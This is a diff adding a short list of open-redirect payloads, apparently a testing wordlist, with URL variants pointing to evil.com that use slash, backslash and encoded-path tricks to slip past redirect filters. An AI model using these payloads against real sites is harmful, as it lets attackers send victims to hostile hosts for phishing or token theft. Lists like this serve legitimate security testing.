@@ -1,0 +1,9 @@
+# Open Redirect payloads
+//evil.com
+https://evil.com
+http://evil.com
+/\evil.com
+//evil.com/%2F..
+///evil.com
+/redirect?url=https://evil.com
+\evil.com
